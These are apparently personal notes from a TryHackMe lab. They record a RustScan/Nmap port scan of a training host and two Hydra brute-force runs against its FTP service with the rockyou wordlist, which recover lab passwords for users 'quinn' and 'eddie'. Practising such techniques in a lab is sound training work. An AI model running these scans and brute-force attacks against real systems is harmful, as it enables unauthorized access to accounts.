---
date: 2024-12-28T01:57:00
tags:
  - TryHackMe
---
# Nmap Scan:
```c
┌─[✗]─[ghost@parrot]─[~]
└──╼ $rustscan -a 10.10.7.17
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/ghost/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.7.17:22
Open 10.10.7.17:80
Open 10.10.7.17:139
Open 10.10.7.17:445
Open 10.10.7.17:8080
Open 10.10.7.17:10021
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-28 01:53 IST
Initiating Ping Scan at 01:53
Scanning 10.10.7.17 [4 ports]
Completed Ping Scan at 01:53, 0.36s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:53
Completed Parallel DNS resolution of 1 host. at 01:53, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 01:53
Scanning 10.10.7.17 [6 ports]
Discovered open port 445/tcp on 10.10.7.17
Discovered open port 8080/tcp on 10.10.7.17
Discovered open port 22/tcp on 10.10.7.17
Discovered open port 80/tcp on 10.10.7.17
Discovered open port 10021/tcp on 10.10.7.17
Discovered open port 139/tcp on 10.10.7.17
Completed SYN Stealth Scan at 01:53, 0.20s elapsed (6 total ports)
Nmap scan report for 10.10.7.17
Host is up, received timestamp-reply ttl 60 (0.24s latency).
Scanned at 2024-12-28 01:53:56 IST for 0s

PORT      STATE SERVICE      REASON
22/tcp    open  ssh          syn-ack ttl 60
80/tcp    open  http         syn-ack ttl 60
139/tcp   open  netbios-ssn  syn-ack ttl 60
445/tcp   open  microsoft-ds syn-ack ttl 60
8080/tcp  open  http-proxy   syn-ack ttl 60
10021/tcp open  unknown      syn-ack ttl 60

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
           Raw packets sent: 10 (416B) | Rcvd: 7 (304B)
```

# Hydra Scan 
```c
$hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -vV ftp://10.10.7.17:10021
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-28 02:04:07
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.7.17:10021/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "princess" - 6 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "nicole" - 11 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "lovely" - 15 of 14344399 [child 14] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "jessica" - 16 of 14344399 [child 15] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "654321" - 17 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "michael" - 18 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "ashley" - 19 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "qwerty" - 20 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "111111" - 21 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "iloveu" - 22 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "000000" - 23 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "michelle" - 24 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "tigger" - 25 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "sunshine" - 26 of 14344399 [child 8] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "chocolate" - 27 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "password1" - 28 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "soccer" - 29 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "anthony" - 30 of 14344399 [child 13] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "friends" - 31 of 14344399 [child 14] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "butterfly" - 32 of 14344399 [child 15] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "purple" - 33 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "angel" - 34 of 14344399 [child 8] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "jordan" - 35 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "liverpool" - 36 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "justin" - 37 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "loveme" - 38 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "fuckyou" - 39 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "123123" - 40 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "football" - 41 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "secret" - 42 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "andrea" - 43 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "carlos" - 44 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "jennifer" - 45 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "joshua" - 46 of 14344399 [child 13] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "bubbles" - 47 of 14344399 [child 14] (0/0)
[ATTEMPT] target 10.10.7.17 - login "quinn" - pass "1234567890" - 48 of 14344399 [child 15] (0/0)
[10021][ftp] host: 10.10.7.17   login: quinn   password: andrea
[STATUS] attack finished for 10.10.7.17 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-28 02:04:19
┌─[ghost@parrot]─[~]
└──╼ $echo eddie > users.txt
┌─[ghost@parrot]─[~]
└──╼ $hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -vV ftp://10.10.7.17:10021
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-28 02:05:27
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.7.17:10021/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "princess" - 6 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "nicole" - 11 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "lovely" - 15 of 14344399 [child 14] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "jessica" - 16 of 14344399 [child 15] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "654321" - 17 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "michael" - 18 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "ashley" - 19 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "qwerty" - 20 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "111111" - 21 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "iloveu" - 22 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "000000" - 23 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "michelle" - 24 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "tigger" - 25 of 14344399 [child 8] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "sunshine" - 26 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "chocolate" - 27 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "password1" - 28 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "soccer" - 29 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "anthony" - 30 of 14344399 [child 13] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "friends" - 31 of 14344399 [child 14] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "butterfly" - 32 of 14344399 [child 15] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "purple" - 33 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "angel" - 34 of 14344399 [child 15] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "jordan" - 35 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "liverpool" - 36 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "justin" - 37 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "loveme" - 38 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "fuckyou" - 39 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "123123" - 40 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "football" - 41 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "secret" - 42 of 14344399 [child 8] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "andrea" - 43 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "carlos" - 44 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "jennifer" - 45 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "joshua" - 46 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "bubbles" - 47 of 14344399 [child 13] (0/0)
[ATTEMPT] target 10.10.7.17 - login "eddie" - pass "1234567890" - 48 of 14344399 [child 14] (0/0)
[10021][ftp] host: 10.10.7.17   login: eddie   password: jordan
[STATUS] attack finished for 10.10.7.17 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-28 02:05:39
```
